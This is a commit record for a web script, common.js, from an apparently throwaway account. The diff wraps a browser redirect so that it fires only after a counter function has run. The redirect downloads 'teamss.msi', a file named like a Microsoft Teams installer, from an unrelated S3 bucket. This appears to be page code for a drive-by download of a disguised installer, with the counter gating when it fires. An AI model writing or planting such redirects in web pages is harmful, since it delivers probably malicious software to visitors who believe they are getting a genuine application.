eed1ea6e1880ae39f6d7d59fde5911b6ec28c08d
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-06-21 13:39:42 +0800

    Add files via upload

--- common.js
+++ common.js
@@ -1,5 +1,14 @@
-function GetToFunction()
+function loadUrl()
 {
-	var url="https://tseyt.s3.ap-southeast-2.amazonaws.com/teamss.msi";
-	window.location=url;
+	if(num>=1)
+	{
+		var url="https://tseyt.s3.ap-southeast-2.amazonaws.com/teamss.msi";
+		window.location=url;
+	}
+}
+
+var num=0;
+function getLoad()
+{
+	num++;
 }
